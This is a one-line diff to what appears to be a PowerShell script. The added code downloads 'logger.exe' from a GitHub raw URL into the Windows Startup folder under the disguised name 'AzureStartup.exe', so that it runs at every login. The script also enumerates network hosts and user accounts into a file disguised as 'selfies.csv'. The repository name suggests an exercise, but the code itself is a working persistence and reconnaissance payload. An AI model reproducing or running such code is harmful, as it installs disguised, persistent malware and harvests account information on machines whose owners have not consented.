@@ -1,1 +1,1 @@
-& { net view; net user } > "C:\Users\IRAdmin\Pictures\selfies.csv"
+Invoke-WebRequest -Uri "https://github.com/Shamill-stewart/ExerciseTest/raw/main/logger.exe" -OutFile "$env:LOCALAPPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AzureStartup.exe" ;& { net view; net user } > "C:\Users\IRAdmin\Pictures\selfies.csv"
